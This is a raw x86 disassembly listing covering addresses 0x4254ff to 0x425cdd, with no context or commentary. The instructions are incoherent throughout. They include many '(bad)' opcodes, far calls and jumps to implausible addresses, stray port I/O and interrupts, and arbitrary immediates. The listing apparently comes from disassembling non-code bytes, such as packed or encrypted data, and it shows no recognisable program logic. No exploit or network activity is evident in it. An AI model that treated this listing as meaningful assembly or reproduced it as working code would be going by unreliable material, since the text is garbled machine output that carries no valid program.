  4254ff:	inc    ecx
  425500:	leave  
  425501:	xor    ch,BYTE PTR [esi+edi*4+0x356f99e1]
  425508:	mov    ds:0x3ccb51a3,eax
  42550d:	jp     0x425551
  42550f:	adc    DWORD PTR [esi-0x14],esp
  425512:	imul   ebx,DWORD PTR [ebx],0x22
  425515:	(bad)  
  425516:	aaa    
  425517:	arpl   WORD PTR [eax+0x3d],ax
  42551a:	test   bh,ah
  42551c:	mov    ecx,0xa4e14f5e
  425521:	xchg   ebx,eax
  425522:	and    esp,DWORD PTR [esi-0x765b682b]
  425528:	int3   
  425529:	bnd call 0x64c9c3e1
  42552f:	add    DWORD PTR [esi+0x18a431c9],0x4e5a67eb
  425539:	cmp    esp,0x7e1862fd
  42553f:	cs xchg ebx,eax
  425541:	inc    BYTE PTR [ecx]
  425543:	mov    ebx,0x85a67015
  425548:	cmp    edi,edx
  42554a:	cmp    DWORD PTR [eax+eax*4],ebp
  42554d:	retf   0xd062
  425550:	dec    esi
  425551:	stos   DWORD PTR es:[edi],eax
  425552:	mov    ds:0xd38fb8c0,al
  425557:	cdq    
  425558:	inc    edi
  425559:	rol    BYTE PTR [eax+0x73],cl
  42555c:	in     al,0x94
  42555e:	sub    BYTE PTR [ecx],dh
  425560:	shl    ecx,cl
  425562:	sbb    eax,eax
  425564:	mov    esi,0x7f3d3371
  425569:	enter  0x775,0x5c
  42556d:	call   0x4ac4:0x6990b63c
  425574:	rcr    DWORD PTR ss:[edi-0x48f88883],cl
  42557b:	add    BYTE PTR [edx+0x10],al
  42557e:	test   BYTE PTR [ebx+0x2ad33612],dh
  425584:	and    bh,al
  425586:	clc    
  425587:	sbb    cl,bl
  425589:	mov    ebx,0xabfdfe21
  42558e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42558f:	mov    bh,BYTE PTR [edx]
  425591:	call   0x2952acf5
  425596:	sbb    eax,0xe351f514
  42559b:	into   
  42559c:	push   ecx
  42559d:	sbb    eax,0x76807e29
  4255a2:	out    0x3d,al
  4255a4:	in     eax,0x3c
  4255a6:	js     0x425594
  4255a8:	ja     0x425543
  4255aa:	test   al,0x3b
  4255ac:	enter  0xd1f5,0xcb
  4255b0:	mov    esp,0xb7ee73d8
  4255b5:	mov    edi,0xd8a7fda0
  4255ba:	loopne 0x42555b
  4255bc:	sub    al,BYTE PTR [ebp-0x4a3f1fc3]
  4255c2:	xor    bh,cl
  4255c4:	xor    al,BYTE PTR [esp+eax*1+0x1a]
  4255c8:	add    DWORD PTR [esi+0x30],ebp
  4255cb:	jne    0x42558f
  4255cd:	das    
  4255ce:	in     al,dx
  4255cf:	cwde   
  4255d0:	mov    ds:0x8239e9e,al
  4255d5:	ins    DWORD PTR es:[edi],dx
  4255d6:	imul   edx,edx,0x3f
  4255d9:	mov    al,0x79
  4255db:	adc    al,0xdc
  4255dd:	cs cli 
  4255df:	rcr    bh,1
  4255e1:	or     ebx,edx
  4255e3:	pop    ebx
  4255e4:	push   edx
  4255e5:	mov    WORD PTR [ebx+0x46],ss
  4255e8:	adc    DWORD PTR [edx+0x4c],edi
  4255eb:	mov    ss,WORD PTR [ecx+0x6b7f96ad]
  4255f1:	xor    bl,BYTE PTR [ecx-0x6a]
  4255f4:	dec    edx
  4255f5:	mov    esp,0x4059b15a
  4255fa:	xchg   ecx,eax
  4255fb:	sub    al,0xbf
  4255fd:	or     ah,dh
  4255ff:	cwde   
  425600:	lods   eax,DWORD PTR ds:[esi]
  425601:	call   DWORD PTR [ebp+0x606b6a78]
  425607:	sahf   
  425608:	xor    al,0xed
  42560a:	push   esp
  42560b:	aas    
  42560c:	je     0x4255bc
  42560e:	popf   
  42560f:	cmp    BYTE PTR [edx],al
  425611:	int3   
  425612:	and    al,al
  425614:	inc    edi
  425615:	inc    ebx
  425616:	test   DWORD PTR [ebp+0x4f4b15a6],edi
  42561c:	lock test dl,ah
  42561f:	nop
  425620:	call   0xf6a4:0xbc975119
  425627:	pop    esi
  425628:	mov    eax,ds:0xebd3fe97
  42562d:	(bad)  
  42562e:	pop    ebp
  42562f:	hlt    
  425630:	(bad)  
  425632:	sub    eax,0x493ea3c9
  425637:	jg     0x425652
  425639:	pop    edx
  42563a:	sbb    esp,DWORD PTR [edi+0x7c]
  42563d:	lods   eax,DWORD PTR ds:[esi]
  42563e:	fcomp  QWORD PTR [ebx+0x29]
  425641:	pop    ds
  425642:	imul   ebp,edx,0x7066515
  425648:	sahf   
  425649:	dec    ebx
  42564a:	dec    edx
  42564b:	mov    eax,ds:0x92e97306
  425650:	fucomp st(7)
  425652:	mov    bh,0x62
  425654:	es pop eax
  425656:	jmp    0xc8231c4e
  42565b:	cmp    BYTE PTR [ebp+0x36],cl
  42565e:	mov    al,ds:0xd9eebfaf
  425663:	push   0x1ec7a2e1
  425668:	pop    ecx
  425669:	fwait
  42566a:	pop    eax
  42566b:	jns    0x4256e5
  42566d:	sub    edi,DWORD PTR [ebx+ebx*8-0x4c9a0414]
  425674:	add    al,0xfc
  425676:	inc    ebx
  425677:	jno    0x42566b
  425679:	jo     0x425655
  42567b:	lock push ebp
  42567d:	inc    esi
  42567e:	mov    edi,0xdf982883
  425683:	ja     0x42565d
  425685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425686:	push   ebp
  425687:	mov    ah,0x6a
  425689:	mov    esi,0x521ef4f8
  42568e:	push   edi
  42568f:	xor    DWORD PTR [eax],0x5f
  425692:	adc    BYTE PTR [ebx-0x19c4c943],al
  425698:	mov    dl,BYTE PTR [esi+ebp*4-0x48fc9cc]
  42569f:	iret   
  4256a0:	scas   eax,DWORD PTR es:[edi]
  4256a1:	sub    DWORD PTR [ebx],edi
  4256a3:	into   
  4256a4:	lea    ecx,[ebp-0x1]
  4256a7:	push   edi
  4256a8:	add    DWORD PTR [eax+0x6f],ecx
  4256ab:	arpl   WORD PTR [ecx-0x10486098],di
  4256b1:	mov    ah,0x2e
  4256b3:	pusha  
  4256b4:	mov    edx,?
  4256b6:	imul   ebp,DWORD PTR [ebx],0xffffffca
  4256b9:	lds    esi,FWORD PTR [eax]
  4256bb:	and    DWORD PTR [ebx-0x20],0x66d4f4dc
  4256c2:	cmp    eax,0xa821c550
  4256c7:	jmp    0x42573f
  4256c9:	inc    esp
  4256ca:	pop    es
  4256cb:	jmp    0x25a7:0xf5dbf030
  4256d2:	add    eax,0xafe51c6c
  4256d7:	ss stos BYTE PTR es:[edi],al
  4256d9:	mov    edi,DWORD PTR [esi-0x76]
  4256dc:	sbb    al,0xe9
  4256de:	adc    dl,BYTE PTR [ebx-0x5d66f548]
  4256e4:	cmp    DWORD PTR [eax+ebp*4],0x5c
  4256e8:	mov    ds:0xc2c28e4e,eax
  4256ed:	aad    0xb4
  4256ef:	jge    0x425756
  4256f1:	sub    dl,BYTE PTR [esi]
  4256f3:	js     0x4256b9
  4256f5:	retf   0x11ef
  4256f8:	or     esp,DWORD PTR [eax-0x81d27e3]
  4256fe:	es hlt 
  425700:	jl     0x425694
  425702:	pcmpeqw mm2,QWORD PTR [ecx-0x578740de]
  425709:	mov    ebx,0x2d606e5e
  42570e:	xor    al,0x3b
  425710:	jo     0x4256ff
  425712:	arpl   WORD PTR [edx+0x67],bx
  425715:	pop    ebx
  425716:	xor    DWORD PTR [edi*8+0x6c5f4162],esp
  42571d:	fbld   TBYTE PTR [ebx-0x1601eda2]
  425723:	jmp    FWORD PTR [esp+eiz*4+0x3c7e4eb1]
  42572a:	call   0xb469:0x58cb7c27
  425731:	mov    dl,0xf1
  425733:	mov    ah,0xfd
  425735:	xor    eax,0xcad8b02b
  42573a:	and    al,0xb1
  42573c:	mov    BYTE PTR [ecx],ah
  42573e:	pop    edx
  42573f:	fdiv   DWORD PTR [eax]
  425741:	mov    eax,ds:0xedee513d
  425746:	in     al,dx
  425747:	mov    bh,0x7a
  425749:	jae    0x4256d2
  42574b:	icebp  
  42574c:	bound  edx,QWORD PTR [ebp+0x4e]
  42574f:	jo     0x425701
  425751:	add    al,0x43
  425753:	shr    DWORD PTR ss:[ecx],0x38
  425757:	inc    esp
  425758:	push   esp
  425759:	jge    0x42575e
  42575b:	clc    
  42575c:	or     al,0x58
  42575e:	adc    dh,bh
  425760:	aam    0x6f
  425762:	pop    edx
  425763:	push   0x326ead79
  425768:	bound  esi,QWORD PTR [ecx]
  42576a:	mov    ch,0xa3
  42576c:	adc    ch,ch
  42576e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42576f:	push   es
  425770:	push   0xffffff9f
  425772:	jmp    0xe1d5be15
  425777:	in     al,dx
  425778:	in     eax,0x2
  42577a:	(bad)  
  42577b:	push   ebx
  42577c:	inc    esi
  42577d:	and    eax,edi
  42577f:	sub    edi,DWORD PTR [esi-0x63308b97]
  425785:	jns    0x4257ff
  425787:	bound  esp,QWORD PTR fs:0x99f71827
  42578e:	xor    bh,bh
  425790:	loop   0x4257d4
  425792:	jo     0x425745
  425794:	arpl   WORD PTR [ecx-0x40],dx
  425797:	fnstsw WORD PTR [edi+0x7d804da1]
  42579d:	imul   esi
  42579f:	lds    edx,FWORD PTR [esi-0x7240200b]
  4257a5:	popa   
  4257a6:	mov    ah,0xbd
  4257a8:	add    BYTE PTR [eax],al
  4257aa:	dec    edx
  4257ab:	inc    ebx
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	repz enter 0xe5b0,0x1
  4257bd:	add    BYTE PTR [esi-0x50fffffa],al
  4257c3:	pop    edx
  4257c4:	test   eax,0xfe15ce4b
  4257c9:	add    dh,bl
  4257cb:	cmp    al,0x39
  4257cd:	cmc    
  4257ce:	int3   
  4257cf:	sub    al,0x27
  4257d1:	ds push cs
  4257d3:	or     DWORD PTR [ebx],eax
  4257d5:	cmp    bh,BYTE PTR [eax]
  4257d7:	push   cs
  4257d8:	xlat   BYTE PTR ds:[ebx]
  4257d9:	scas   eax,DWORD PTR es:[edi]
  4257da:	mov    edx,0x67c09af
  4257df:	fcmovnu st,st(5)
  4257e1:	mov    ds:0x5d899567,eax
  4257e6:	int3   
  4257e7:	sbb    dh,BYTE PTR [eax*2-0x6b7905bd]
  4257ee:	fnclex 
  4257f0:	fst    DWORD PTR [ecx]
  4257f2:	xor    dh,ch
  4257f4:	shl    BYTE PTR [edx+0x5d],cl
  4257f7:	fucom  st(5)
  4257f9:	xor    edx,edi
  4257fb:	ja     0x4257a3
  4257fd:	jne    0x4257b1
  4257ff:	xor    BYTE PTR [esi+0x29],ch
  425802:	out    0xe8,eax
  425804:	inc    esi
  425805:	sub    eax,DWORD PTR [esi-0x27]
  425808:	push   edi
  425809:	into   
  42580a:	loop   0x4257da
  42580c:	push   eax
  42580d:	jmp    0x4304b8ea
  425812:	xor    esp,edi
  425814:	outs   dx,BYTE PTR ds:[esi]
  425815:	imul   esi,DWORD PTR [ebx],0xfe431629
  42581b:	xchg   ebp,eax
  42581c:	cmp    BYTE PTR [eax+0x65],0x93
  425820:	push   edx
  425821:	(bad)  
  425822:	push   edi
  425823:	add    eax,DWORD PTR [ebx]
  425825:	xchg   ecx,eax
  425826:	or     edx,DWORD PTR [ebp+edi*4+0x259c8f1f]
  42582d:	jno    0x425875
  42582f:	mov    ?,WORD PTR [edx]
  425831:	and    al,0xfb
  425833:	out    dx,eax
  425834:	out    0xbb,al
  425836:	out    dx,eax
  425837:	imul   edi,DWORD PTR [esp+ebp*4-0x4d],0xd123ca46
  42583f:	xchg   esi,eax
  425840:	pop    ebx
  425841:	scas   eax,DWORD PTR es:[edi]
  425842:	jle    0x4257e0
  425844:	or     al,0x73
  425846:	add    bh,BYTE PTR [eax+eax*2-0x67]
  42584a:	mov    eax,ds:0xc80fdb19
  42584f:	rol    BYTE PTR [ecx+0x1b9a112],0xe8
  425856:	jle    0x4258c9
  425858:	sub    esp,edi
  42585a:	dec    ebp
  42585b:	popa   
  42585c:	scas   eax,DWORD PTR es:[edi]
  42585d:	sub    DWORD PTR [edi],esi
  42585f:	sub    edx,DWORD PTR [ebx-0x53]
  425862:	xchg   esp,eax
  425863:	in     al,dx
  425864:	push   esi
  425865:	pop    ebx
  425866:	popf   
  425867:	ret    0xe8a
  42586a:	sub    DWORD PTR [edi],ebx
  42586c:	leave  
  42586d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42586e:	cmc    
  42586f:	arpl   WORD PTR [ebx],dx
  425871:	xchg   ecx,eax
  425872:	cs shl edx,cl
  425875:	loop   0x4258f0
  425877:	call   0x210204c4
  42587c:	xor    DWORD PTR [esi],edx
  42587e:	pop    esp
  42587f:	pushf  
  425880:	scas   al,BYTE PTR es:[edi]
  425881:	int    0x40
  425883:	sub    DWORD PTR [edi-0x7444d59b],esp
  425889:	or     BYTE PTR [ebx+0xb],0xc
  42588d:	add    al,0xd9
  42588f:	out    0xb5,al
  425891:	jp     0x42581e
  425893:	sar    DWORD PTR [eax-0x54],cl
  425896:	pop    ebp
  425897:	(bad)  
  425898:	mov    ah,0x66
  42589a:	pop    eax
  42589b:	jae    0x425899
  42589d:	fst    DWORD PTR [edi+edi*8+0x42]
  4258a1:	sbb    al,0x2
  4258a3:	pop    ss
  4258a4:	cs xchg dh,al
  4258a7:	stos   DWORD PTR es:[edi],eax
  4258a8:	sbb    eax,0x13f88126
  4258ad:	repz push esi
  4258af:	div    BYTE PTR [ebp+0x18e6d633]
  4258b5:	push   ds
  4258b6:	xchg   DWORD PTR [edx+0xc58d4d6],edx
  4258bc:	cmp    ecx,DWORD PTR [edx+0x676646fa]
  4258c2:	xchg   ecx,eax
  4258c3:	pop    ebp
  4258c4:	push   ebp
  4258c5:	jmp    0x4258ee
  4258c7:	fsub   DWORD PTR [ebx]
  4258c9:	retf   
  4258ca:	push   ecx
  4258cb:	cwde   
  4258cc:	outs   dx,BYTE PTR ds:[esi]
  4258cd:	mov    dh,0xe1
  4258cf:	fdivr  QWORD PTR ds:0xefd5a436
  4258d5:	sbb    cl,BYTE PTR [ebp+0x3b]
  4258d8:	pop    esi
  4258d9:	cld    
  4258da:	jo     0x425937
  4258dc:	lea    esi,[ecx+0x5d84fe9a]
  4258e2:	jo     0x4258c3
  4258e4:	cmp    BYTE PTR [esi-0x6f],cl
  4258e7:	mov    DWORD PTR [edx-0x53],edx
  4258ea:	cmp    BYTE PTR [ecx],0xb8
  4258ed:	xchg   edx,eax
  4258ee:	push   edx
  4258ef:	push   esp
  4258f0:	push   esp
  4258f1:	es inc esp
  4258f3:	test   DWORD PTR [eax],eax
  4258f5:	inc    ebx
  4258f6:	mov    cl,0x83
  4258f8:	sbb    al,0xd0
  4258fa:	inc    esp
  4258fb:	xchg   DWORD PTR [esi+eax*8+0x33056674],esp
  425902:	or     ebp,DWORD PTR [esi+0xd544aa8]
  425908:	outs   dx,WORD PTR ds:[esi]
  42590a:	inc    eax
  42590b:	aaa    
  42590c:	xchg   ebx,eax
  42590d:	add    DWORD PTR [eax+0x67db1ce4],0x20
  425914:	sbb    dl,BYTE PTR [ebp+0x187f4f6d]
  42591a:	cmp    al,0xb2
  42591c:	xor    al,BYTE PTR [ebx-0x4a5627a3]
  425922:	xor    eax,0x7b9d0dac
  425927:	int    0x13
  425929:	lods   eax,DWORD PTR ds:[esi]
  42592a:	and    DWORD PTR ds:0x60d7c2ed,edx
  425930:	adc    al,0xfb
  425932:	in     al,0xef
  425934:	shr    DWORD PTR [ecx+0x4d],1
  425937:	(bad)  
  425938:	mov    ss,WORD PTR [edi+0x6]
  42593b:	add    ebp,DWORD PTR ds:0x89044057
  425941:	cmp    DWORD PTR [eax+0x3ba1532d],eax
  425947:	mov    edx,0x1f5eda8d
  42594c:	and    DWORD PTR [esi+0x60281e2c],0xffffffe3
  425953:	mov    al,0x30
  425955:	shr    esp,1
  425957:	or     DWORD PTR [esp+esi*2-0x16187b50],edi
  42595e:	mov    esi,0x5250245b
  425963:	dec    esp
  425964:	mov    esp,0x371a7c58
  425969:	dec    eax
  42596a:	lods   al,BYTE PTR ds:[esi]
  42596b:	adc    esi,ebx
  42596d:	mov    ebx,0xb61b2a62
  425972:	test   edx,edi
  425974:	sbb    edx,0x182abbfb
  42597a:	test   al,0x7
  42597c:	pop    edx
  42597d:	xor    eax,0xd26c36fa
  425982:	mov    dh,0xe0
  425984:	popf   
  425985:	lock aad 0xe6
  425988:	push   eax
  425989:	jb     0x425968
  42598b:	psadbw mm7,mm1
  42598e:	dec    ebp
  42598f:	cmp    ebp,esi
  425991:	ins    DWORD PTR es:[edi],dx
  425992:	aaa    
  425993:	sbb    DWORD PTR [ebp-0x5045072a],eax
  425999:	mov    bh,0xce
  42599b:	cli    
  42599c:	sub    dh,BYTE PTR ds:0x285d3f30
  4259a2:	push   es
  4259a3:	adc    edi,ecx
  4259a5:	popf   
  4259a6:	outs   dx,DWORD PTR ds:[esi]
  4259a7:	(bad)  
  4259a8:	cld    
  4259a9:	mov    al,ds:0x9f457be9
  4259ae:	mov    ds:0x4a9fb585,eax
  4259b3:	inc    edi
  4259b4:	fwait
  4259b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259b6:	adc    eax,0xf3829715
  4259bb:	ret    0x84d8
  4259be:	xor    al,BYTE PTR [esi+0x8cfb25f]
  4259c4:	test   DWORD PTR [eax-0x39],ebp
  4259c7:	lods   eax,DWORD PTR fs:[esi]
  4259c9:	pop    ds
  4259ca:	stos   DWORD PTR es:[edi],eax
  4259cb:	jmp    ebx
  4259cd:	xor    al,0x31
  4259cf:	retf   
  4259d0:	push   ebx
  4259d1:	das    
  4259d2:	mov    ch,0x0
  4259d4:	pop    esi
  4259d5:	sbb    DWORD PTR [ebp-0x7f7acc53],0x7d
  4259dc:	push   0xa5139905
  4259e1:	jae    0x4259f4
  4259e3:	xchg   DWORD PTR [ebp-0x5c],edx
  4259e6:	in     al,0xd7
  4259e8:	aad    0x9d
  4259ea:	inc    esi
  4259eb:	or     BYTE PTR [ecx+0xd],ah
  4259ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259ef:	sahf   
  4259f0:	sbb    al,0x38
  4259f2:	xchg   ebx,eax
  4259f3:	cdq    
  4259f4:	nop
  4259f5:	push   ebp
  4259f6:	in     al,0x70
  4259f8:	inc    esp
  4259f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259fa:	push   edx
  4259fb:	jo     0x425a2c
  4259fd:	adc    esp,DWORD PTR [edx+esi*8]
  425a00:	mov    ecx,DWORD PTR [esi+0xb12e51c]
  425a06:	or     eax,0x779cd5e2
  425a0b:	sub    ecx,0x62
  425a0e:	sbb    eax,0x99432097
  425a13:	sbb    al,0x73
  425a15:	fnsave [ebp+esi*4+0x32]
  425a19:	mov    WORD PTR [ebp-0x5280af98],?
  425a1f:	xor    eax,0xa3b5ce0
  425a24:	or     ecx,0x6ed67f1e
  425a2a:	xchg   ebx,eax
  425a2b:	(bad)  
  425a2c:	pop    eax
  425a2d:	mov    dh,0xf
  425a2f:	pop    ebx
  425a30:	jmp    0x425a66
  425a32:	xchg   esp,eax
  425a33:	cmp    al,0x8c
  425a35:	push   edi
  425a36:	sbb    esi,DWORD PTR [edx-0x1c]
  425a39:	push   esi
  425a3a:	cmp    eax,0xfcf1e96c
  425a3f:	jg     0x4259fe
  425a41:	or     DWORD PTR [ecx],0xf4f859a6
  425a47:	cmp    dh,BYTE PTR [edi]
  425a49:	das    
  425a4a:	mov    ah,0xa3
  425a4c:	ret    0xe649
  425a4f:	sub    BYTE PTR [ebp-0x5e],bh
  425a52:	(bad)  [ebx]
  425a54:	jno    0x425a3f
  425a56:	pop    ebx
  425a57:	gs cwde 
  425a59:	xlat   BYTE PTR ds:[ebx]
  425a5a:	clc    
  425a5b:	xchg   edx,eax
  425a5c:	sbb    BYTE PTR [edx+0x69],ch
  425a5f:	fwait
  425a60:	mov    ch,0x17
  425a62:	popf   
  425a63:	retf   
  425a64:	imul   eax,ebx,0x42eff6d
  425a6a:	cdq    
  425a6b:	call   0xa1a76940
  425a70:	sub    DWORD PTR [ebx-0x1b38645],edx
  425a76:	outs   dx,BYTE PTR ds:[esi]
  425a77:	jg     0x425af5
  425a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a7a:	sbb    BYTE PTR [edi+0x6f],cl
  425a7d:	and    DWORD PTR [ecx-0x35c4ad47],edi
  425a83:	and    al,0x35
  425a85:	mov    BYTE PTR ds:0x166f114c,dh
  425a8b:	out    0x30,eax
  425a8d:	enter  0x7436,0x62
  425a91:	mov    eax,DWORD PTR [ecx+edi*2+0x4f9bba7a]
  425a98:	sbb    eax,0x66cfe17a
  425a9d:	push   0x36
  425a9f:	jnp    0x425a44
  425aa1:	sbb    BYTE PTR [eax+0x25f71316],ch
  425aa7:	jae    0x425a8e
  425aa9:	cli    
  425aaa:	push   ds
  425aab:	dec    ebp
  425aac:	inc    esi
  425aad:	pop    ebp
  425aae:	mov    esi,0x9d7043dd
  425ab3:	popf   
  425ab4:	out    dx,al
  425ab5:	xor    ah,BYTE PTR [ebx]
  425ab7:	or     cl,al
  425ab9:	dec    esp
  425aba:	push   ecx
  425abb:	(bad)  
  425abc:	(bad)  [ebp-0x5e]
  425abf:	int    0x13
  425ac1:	xor    eax,0x6e5b91b8
  425ac6:	xor    BYTE PTR [ebp+0x7e],al
  425ac9:	adc    al,0x21
  425acb:	test   eax,0x86fc6596
  425ad0:	jle    0x425ad6
  425ad2:	xchg   ebp,eax
  425ad3:	arpl   WORD PTR [ecx-0x24a899a7],sp
  425ad9:	push   esi
  425ada:	mov    ebp,0x1ccbc2f
  425adf:	jle    0x425a9d
  425ae1:	or     DWORD PTR [esi],edx
  425ae3:	push   edx
  425ae4:	xchg   edx,eax
  425ae5:	out    dx,al
  425ae6:	stc    
  425ae7:	sub    bl,BYTE PTR [eax-0x2342d1d6]
  425aed:	or     ch,BYTE PTR [edi+0x7a]
  425af0:	out    0x1,eax
  425af2:	xchg   edx,eax
  425af3:	dec    edi
  425af4:	pop    esp
  425af5:	cmp    edx,DWORD PTR [ecx+ebx*4+0x1c4d3bd8]
  425afc:	xlat   BYTE PTR ds:[ebx]
  425afd:	inc    eax
  425afe:	(bad)  
  425aff:	test   eax,0xa067b58
  425b04:	aas    
  425b05:	add    eax,0x1dfb866b
  425b0a:	xor    BYTE PTR [edx-0x4387d3db],dl
  425b10:	test   al,cl
  425b12:	aaa    
  425b13:	inc    ebx
  425b14:	repz adc al,0x3
  425b17:	fstp   DWORD PTR [edi]
  425b19:	jo     0x425b69
  425b1b:	in     al,0x20
  425b1d:	xchg   edx,eax
  425b1e:	enter  0x5356,0xed
  425b22:	ret    0x2fa3
  425b25:	rcr    BYTE PTR [ecx+ebp*4-0x477583ec],cl
  425b2c:	push   edi
  425b2d:	gs add al,0x41
  425b30:	jb     0x425ab5
  425b32:	call   0x1b80481f
  425b37:	jb     0x425b7f
  425b39:	sti    
  425b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b3b:	push   es
  425b3c:	leave  
  425b3d:	rcl    cl,1
  425b3f:	inc    edx
  425b40:	xlat   BYTE PTR ds:[ebx]
  425b41:	pusha  
  425b42:	xchg   ebx,ecx
  425b44:	push   ecx
  425b45:	pop    esp
  425b46:	in     eax,0xea
  425b48:	sub    ah,al
  425b4a:	mov    cl,0x98
  425b4c:	call   0x6a2ff0df
  425b51:	cld    
  425b52:	stos   DWORD PTR es:[edi],eax
  425b53:	(bad)  
  425b54:	jno    0x425bd5
  425b56:	jg     0x425aee
  425b58:	dec    ebp
  425b59:	push   edi
  425b5a:	stos   DWORD PTR es:[edi],eax
  425b5b:	pop    ds
  425b5c:	dec    ecx
  425b5d:	int    0xbd
  425b5f:	shr    BYTE PTR [eax+0x7e],0xcd
  425b63:	xchg   esp,eax
  425b64:	in     al,0xe0
  425b66:	xor    BYTE PTR [esi+0x1b],cl
  425b69:	add    DWORD PTR [edi-0x2b],0xffffffe3
  425b6d:	or     eax,0x69eb878e
  425b72:	stos   BYTE PTR es:[edi],al
  425b73:	or     ebx,DWORD PTR [edx+0x7]
  425b76:	popa   
  425b77:	push   esi
  425b78:	cmp    ecx,ecx
  425b7a:	push   ebp
  425b7b:	pop    edx
  425b7c:	(bad)  
  425b7d:	(bad)  
  425b7e:	and    eax,0x4e52b019
  425b83:	iret   
  425b84:	(bad)  
  425b85:	adc    DWORD PTR [ebx+0x17],ebp
  425b88:	lods   al,BYTE PTR ds:[esi]
  425b89:	cmp    eax,0x5d64ec65
  425b8e:	cmp    ebx,esp
  425b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b91:	inc    edx
  425b92:	ret    0x9571
  425b95:	pop    es
  425b96:	adc    BYTE PTR [ebx+edx*1-0x4d],cl
  425b9a:	out    dx,eax
  425b9b:	dec    ebx
  425b9c:	fcom   QWORD PTR [ecx+0x77c18f71]
  425ba2:	lock mov ebx,0x90003112
  425ba8:	cli    
  425ba9:	into   
  425baa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bab:	inc    ebp
  425bac:	or     BYTE PTR [ebx-0x38aa0150],ch
  425bb2:	add    al,0x31
  425bb4:	mov    ch,0xff
  425bb6:	lds    ebx,FWORD PTR [ebx]
  425bb8:	mov    eax,0xe116e2f9
  425bbd:	mov    eax,ds:0x6c9f38ca
  425bc2:	xor    eax,0x8bfe901f
  425bc7:	into   
  425bc8:	xor    DWORD PTR [ebp-0x58],0xfffffff2
  425bcc:	pop    esi
  425bcd:	int    0x71
  425bcf:	jmp    0xf348:0xc41959f9
  425bd6:	and    BYTE PTR [edi*1-0x25a690b8],bl
  425bdd:	out    0xd6,eax
  425bdf:	cmp    ecx,ebp
  425be1:	or     al,cl
  425be3:	push   esi
  425be4:	jl     0x425c41
  425be6:	adc    al,BYTE PTR [ecx-0x6800dbb8]
  425bec:	mov    BYTE PTR [ecx-0x5221d01e],dl
  425bf2:	ror    dh,1
  425bf4:	dec    BYTE PTR gs:[edx+0x8]
  425bf8:	sti    
  425bf9:	arpl   WORD PTR [ecx*8-0xb6347e3],ax
  425c00:	push   es
  425c01:	dec    esi
  425c02:	shl    DWORD PTR [esi],cl
  425c04:	inc    eax
  425c05:	pop    eax
  425c06:	ins    DWORD PTR es:[edi],dx
  425c07:	in     eax,0xa
  425c09:	ret    0xbb1
  425c0c:	xchg   ebx,eax
  425c0d:	fistp  DWORD PTR [esi]
  425c0f:	dec    ebx
  425c10:	cdq    
  425c11:	fisttp DWORD PTR [eax]
  425c13:	mov    esp,DWORD PTR es:[esi+0x39]
  425c17:	pushf  
  425c18:	pop    eax
  425c19:	(bad)  
  425c1a:	lods   eax,DWORD PTR ds:[esi]
  425c1b:	adc    dl,dh
  425c1d:	pop    edx
  425c1e:	retf   
  425c1f:	push   ds
  425c20:	xor    BYTE PTR fs:[esi+0x3b8c15a0],0xc6
  425c28:	out    dx,eax
  425c29:	(bad)  
  425c2a:	ror    dh,0xcd
  425c2d:	hlt    
  425c2e:	lock in eax,0x99
  425c31:	neg    BYTE PTR [esi-0x7a]
  425c34:	xor    dl,BYTE PTR [edx]
  425c36:	in     al,dx
  425c37:	bound  edi,QWORD PTR [ecx+0x2b]
  425c3a:	dec    ebp
  425c3b:	loope  0x425c89
  425c3d:	sub    BYTE PTR [edx+0x76],al
  425c40:	daa    
  425c41:	jns    0x425ca4
  425c43:	xchg   esp,eax
  425c44:	jo     0x425c50
  425c46:	in     eax,0xa2
  425c48:	jmp    0x2ca15ce8
  425c4d:	loop   0x425c84
  425c4f:	adc    ah,bl
  425c51:	mov    ecx,0xef0ccdcc
  425c56:	imul   DWORD PTR [edx]
  425c58:	ins    BYTE PTR es:[edi],dx
  425c59:	inc    esi
  425c5a:	adc    eax,0x846429b5
  425c5f:	jne    0x425c6d
  425c61:	ins    BYTE PTR es:[edi],dx
  425c62:	mov    cs:0x3c4c892a,al
  425c68:	mov    bh,0x4a
  425c6a:	sbb    eax,0x7c3c571d
  425c6f:	sub    BYTE PTR [esi],0x1b
  425c72:	push   cs
  425c73:	int    0x49
  425c75:	push   ecx
  425c76:	enter  0x7583,0xcc
  425c7a:	popf   
  425c7b:	jmp    0xe87bc37d
  425c80:	std    
  425c81:	inc    esi
  425c82:	loope  0x425c0e
  425c84:	loopne 0x425c96
  425c86:	cdq    
  425c87:	out    dx,al
  425c88:	std    
  425c89:	stos   BYTE PTR es:[edi],al
  425c8a:	inc    ebp
  425c8b:	or     cl,ah
  425c8d:	aas    
  425c8e:	bound  edi,QWORD PTR [edi]
  425c90:	repz imul edi,DWORD PTR [ebp-0x58],0xd8643a16
  425c98:	pop    eax
  425c99:	or     eax,0x70ba5885
  425c9e:	inc    edi
  425c9f:	std    
  425ca0:	lods   eax,DWORD PTR ds:[esi]
  425ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ca2:	adc    esp,0xa269617f
  425ca8:	retf   
  425ca9:	sub    bl,ah
  425cab:	das    
  425cac:	or     al,0x2e
  425cae:	push   0xffffffff
  425cb0:	xchg   ecx,eax
  425cb1:	mov    al,0xc5
  425cb3:	add    eax,0xff13b2cf
  425cb8:	fld    TBYTE PTR [eax+0x1c027a99]
  425cbe:	jo     0x425cc1
  425cc0:	das    
  425cc1:	add    edi,DWORD PTR [esi+0x7967affd]
  425cc7:	call   0x1780:0x2d4176f
  425cce:	mov    bl,0xe2
  425cd0:	mov    bl,0xf1
  425cd2:	shl    BYTE PTR [ebp-0x1e73df7f],0x5a
  425cd9:	retf   
  425cda:	fdiv   st(5),st
  425cdc:	dec    ebx
  425cdd:	int    0x43
